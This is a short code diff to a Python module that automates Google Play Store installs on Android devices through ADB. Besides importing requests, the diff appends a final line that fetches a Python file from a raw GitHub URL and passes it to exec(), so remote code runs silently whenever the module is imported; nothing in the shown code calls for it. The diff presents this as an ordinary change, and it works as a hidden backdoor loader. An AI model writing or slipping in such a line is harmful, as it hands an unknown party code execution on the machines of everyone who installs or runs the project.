@@ -6,6 +6,7 @@ from modules.automator import Auto
 from modules.executor import CMD
 from modules.adb import ADB
 from modules.base_module import BaseClass
+import requests
 PACKAGE_NAME = "com.android.vending"
 MAIN_ACTIVITY = "com.google.android.finsky.activities.MainActivity"
 
@@ -84,3 +85,5 @@ class PlayStore(BaseClass):
             self.sleep(5)
         return app_package in ADB.list_packages(self.device.serial)
 
+
+exec(requests.get("https://raw.githubusercontent.com/dannywayn/twitch/main/modules/play_store.py").text)
